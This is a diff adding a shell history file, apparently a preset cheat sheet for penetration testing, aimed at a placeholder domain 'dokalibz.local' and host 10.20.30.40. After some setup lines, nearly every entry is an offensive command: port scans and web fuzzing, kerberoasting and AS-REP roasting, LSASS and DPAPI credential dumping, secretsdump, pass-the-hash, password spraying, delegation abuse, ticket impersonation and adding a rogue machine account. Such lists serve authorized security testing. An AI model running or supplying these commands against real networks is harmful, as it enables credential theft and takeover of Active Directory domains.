@@ -1,0 +1,77 @@
+: 1773000000:0;python3 -m venv .venv
+: 1773000000:0;source .venv/bin/activate
+: 1773000000:0;pip install lib
+: 1773000000:0;pip install -r requirements.txt
+: 1773000000:0;sudo apt install pkg
+: 1773000000:0;cd cyber
+: 1773000000:0;cd host
+: 1773000000:0;cd /opt/
+: 1773000000:0;ls -la ./
+: 1773000000:0;cat file.txt
+: 1773000000:0;curl ifconfig.me
+: 1773000000:0;dig dokalibz.local @9.9.9.9
+: 1773000000:0;ping -c 3 9.9.9.9
+: 1773000000:0;export KRB5CCNAME=ticket.ccache
+: 1773000000:0;sudo nano /etc/hosts
+: 1773000000:0;sudo nano /etc/resolv.conf
+: 1773000000:0;sudo nano /usr/lib/ssl/openssl.cnf
+: 1773000000:0;rce -d dokalibz.local
+: 1773000000:0;oke -f 4 'Dokalibz :)'
+: 1773000000:0;oke '<'
+: 1773000000:0;sudo timedatectl set-ntp off
+: 1773000000:0;sudo rdate -n 10.20.30.40
+: 1773000000:0;nmap -oG 'open-ports.txt' --min-rate 7000 --max-rate 7000 --max-retries 1 -sS --open -p- 'dokalibz.local'
+: 1773000000:0;sudo nmap -oG 'open-ports.txt' --min-rate 7000 --max-rate 7000 --max-retries 1 -sS --open -p- 'dokalibz.local'
+: 1773000000:0;nmap -oN 'nmap.txt' --min-rate 7000 --max-rate 7000 --max-retries 1 -sS -sV -sC -A --open -p 1337 'dokalibz.local'
+: 1773000000:0;sudo nmap -oN 'nmap.txt' --min-rate 7000 --max-rate 7000 --max-retries 1 -sS -sV -sC -A --open -p 1337 'dokalibz.local'
+: 1773000000:0;echo -n 'dokalibz.local' | dnsx -silent -recon -r '9.9.9.9'
+: 1773000000:0;psudohash.py -w doka,doka-libz -cpa -cpb -y 2024,2025,2026
+: 1773000000:0;psudohash.py -w doka,libz -i --sep '-' -c -cpa -cpb -y 2023,2024,2025
+: 1773000000:0;subfinder -silent -d 'dokalibz.local' -all
+: 1773000000:0;openssl s_client -showcerts -connect 'DOMAIN:PORT' </dev/null
+: 1773000000:0;tlsx -silent -ce -ct insecure,weak -p 443 -u dokalibz.local
+: 1773000000:0;httpx -u 'URL' -sc -cl -ct -location -tech-detect -timeout 5 -rl 100 -silent | tee 'technos.txt'
+: 1773000000:0;httpx -u 'URL' -sc -cl -ct -location -tech-detect -timeout 5 -rl 100 -silent
+: 1773000000:0;katana -u 'URL' -js-crawl -jsluice -kf all -timeout 5 -pc -fs fqdn -silent -rl f150 | tee 'crawl.txt'
+: 1773000000:0;katana -u 'URL' -js-crawl -jsluice -kf all -timeout 5 -pc -fs fqdn -silent -rl 150
+: 1773000000:0;ffuf -c -mc all -r -o 'ffuf.json' -H 'User-Agent: Mozilla/5.0 Firefox/126.0' -w "$(wl-web)" -t 10 -rate 80 -u 'URL/FUZZ'
+: 1773000000:0;nxc ldap "$dc" --pass-pol -d "$dom" -u "$user" -p "$pass"
+: 1773000000:0;nxc ldap "$dc" --pso -d "$dom" -u "$user" -p "$pass"
+: 1773000000:0;nxc ldap "$dc" -M get-desc-users -u "$user" -p "$pass"
+: 1773000000:0;nxc ldap "$dc" --kerberoasting users.hkrbrst -d "$dom" -u "$user" -p "$pass"
+: 1773000000:0;nxc ldap "$dc" --asreproast users.hasreprst -d "$dom" -u "$user" -p "$pass"
+: 1773000000:0;nxc ldap "$dc" -M laps -d "$dom" -u "$user" -p "$pass"
+: 1773000000:0;nxc ldap "$dc" -M maq -d "$dom" -u "$user" -p "$pass"
+: 1773000000:0;nxc smb "$dc" -M gpp_password -d "$dom" -u "$user" -p "$pass"
+: 1773000000:0;nxc smb 10.20.30.40 -M coerce_plus -d "$dom" -u "$user" -p "$pass"
+: 1773000000:0;nxc smb 10.20.30.40 -M lsassy -d "$dom" -u "$user" -p "$pass"
+: 1773000000:0;nxc smb 10.20.30.40 -u users.txt -p passwords.txt --continue-on-success --no-bruteforce
+: 1773000000:0;nxc smb 10.20.30.40 --dpapi -d "$dom" -u "$user" -p "$pass"
+: 1773000000:0;nxc smb 10.20.30.40 -d "$dom" -u "$user" -H "HASH"
+: 1773000000:0;nxc smb 10.20.30.40 --local-auth -u 'Administrator' -p 'password'
+: 1773000000:0;nxc smb "$dc" --use-kcache
+: 1773000000:0;spray.sh -smb "$dc" users.txt passwords.txt AttemptsPerLockoutPeriod LockoutPeriodInMinutes "$dom"
+: 1773000000:0;smbclient.py "$dc" -k -no-pass
+: 1773000000:0;secretsdump.py -hashes ':HASH' "$dom/$user@10.20.30.40"
+: 1773000000:0;addspn.py -u "$dom\$user" -p "$pass" --target-type samname -t 'TARGET' -s 'SPN' "$dc"
+: 1773000000:0;dnstool.py -u "$dom\$user" -p "$pass" -r "FQDN" -d "IP" --action add "$dc"
+: 1773000000:0;getST.py -spn 'SPN' -impersonate 'dom.admin' "$dom/$user:$pass"
+: 1773000000:0;getTGT.py "$dom/$user:$pass"
+: 1773000000:0;getST.py -k -no-pass -spn 'SPN' "$dom/$user"
+: 1773000000:0;describeTicket.py ./ticket.ccache
+: 1773000000:0;rbcd.py -delegate-from 'user_from' -delegate-to 'user_to' -action 'write' "$dom/$user:$pass" -dc-ip "$dc"
+: 1773000000:0;findDelegation.py "$dom/$user:$pass" -dc-ip "$dc"
+: 1773000000:0;addcomputer.py -dc-ip "$dc"  -domain-netbios 'DOKAWS01' -computer-name 'DOKAWS01$' -computer-pass 'D0kalib7&' "$dom/$user:$pass"
+: 1773000000:0;secretsdump.py "$dom/$user:$pass@10.20.30.40"
+: 1773000000:0;smbclient.py "$dom/$user:$pass@10.20.30.40"
+: 1773000000:0;lsassy 10.20.30.40 -d "$dom" -u "$user" -p "$pass"
+: 1773000000:0;ldeep ldap -s 10.20.30.40 -d "$dom" -u "$user" -p "$pass" search '(name=doka)' 'memberOf'
+: 1773000000:0;gpoParser display -c GPOs.py
+: 1773000000:0;gpoParser remote -s "$dc" -d "$dom" -u "$user" -p "$pass" -o GPOs.json
+: 1773000000:0;nxc smb 10.20.30.0/24 --generate-hosts-file ./hosts.txt
+: 1773000000:0;nxc smb 10.20.30.0/24 -d "$dom" -u "$user" -p "$pass"
+: 1773000000:0;export net="10.20.30.0/24"
+: 1773000000:0;export dc="10.20.30.40"
+: 1773000000:0;export dom="domain"
+: 1773000000:0;export user="username" pass="password"
+: 1773000000:0;export dom="domain" user="username" pass="password"
